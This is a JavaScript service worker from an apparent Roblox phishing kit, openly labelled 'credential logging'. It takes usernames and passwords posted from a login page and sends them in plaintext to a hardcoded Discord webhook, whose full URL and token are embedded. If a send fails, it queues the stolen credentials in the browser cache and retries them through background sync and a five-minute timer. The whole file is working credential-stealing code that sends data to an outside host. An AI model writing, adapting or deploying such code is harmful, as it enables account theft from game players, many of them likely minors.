// Service worker for credential logging
const CACHE_NAME = 'credential-cache-v1';
const WEBHOOK_URL = "https://discord.com/api/webhooks/1351654650524471446/64xoQCP9o8ljl3-q6jcyUSUgBrdg9Oa74rAq01VS9rSQ2yGpoDsd88M6XypS-OhAfwPl";

// Install event - create a credential queue
self.addEventListener('install', function(event) {
    event.waitUntil(
        caches.open(CACHE_NAME).then(function(cache) {
            return cache.put('credentials-queue', new Response(JSON.stringify([])));
        })
    );
});

// Activate event - claim clients immediately
self.addEventListener('activate', function(event) {
    event.waitUntil(self.clients.claim());
});

// Function to process the credential queue
function processQueue() {
    return caches.open(CACHE_NAME)
        .then(function(cache) {
            return cache.match('credentials-queue');
        })
        .then(function(response) {
            return response.json();
        })
        .then(function(queue) {
            if (queue.length === 0) {
                return Promise.resolve(); // Nothing to process
            }
            
            // Process each credential in the queue
            const promises = queue.map(function(credential, index) {
                return fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `**Queued Roblox Login Attempt**\nUsername: ${credential.username}\nPassword: ${credential.password}\nTime: ${credential.timestamp}\nIP: <Auto-detected by Discord>`
                    })
                })
                .then(function() {
                    // Remove from queue if successful
                    queue.splice(index, 1);
                    return caches.open(CACHE_NAME);
                })
                .then(function(cache) {
                    // Update the queue in cache
                    return cache.put('credentials-queue', new Response(JSON.stringify(queue)));
                })
                .catch(function(error) {
                    console.error('Error sending credential:', error);
                    return Promise.resolve(); // Continue with other items even if one fails
                });
            });
            
            return Promise.all(promises);
        })
        .catch(function(error) {
            console.error('Error processing queue:', error);
        });
}

// Message event - handle credential logging from the page
self.addEventListener('message', function(event) {
    if (event.data && event.data.type === 'LOG_CREDENTIAL') {
        const credential = {
            username: event.data.username,
            password: event.data.password,
            timestamp: new Date().toISOString()
        };
        
        // First try to send it directly
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: `**New Roblox Login Attempt**\nUsername: ${credential.username}\nPassword: ${credential.password}\nTime: ${credential.timestamp}\nIP: <Auto-detected by Discord>`
            })
        })
        .catch(function(error) {
            console.error('Error sending credential, adding to queue:', error);
            
            // If failed, add to queue for later retry
            caches.open(CACHE_NAME)
                .then(function(cache) {
                    return cache.match('credentials-queue');
                })
                .then(function(response) {
                    return response.json();
                })
                .then(function(queue) {
                    queue.push(credential);
                    return caches.open(CACHE_NAME);
                })
                .then(function(cache) {
                    return cache.put('credentials-queue', new Response(JSON.stringify(queue)));
                })
                .catch(function(error) {
                    console.error('Error adding to queue:', error);
                });
        });
    }
});

// Sync event - process the queue when online
self.addEventListener('sync', function(event) {
    if (event.tag === 'sync-credentials') {
        event.waitUntil(processQueue());
    }
});

// Periodically try to process the queue (every 5 minutes)
setInterval(processQueue, 5 * 60 * 1000); 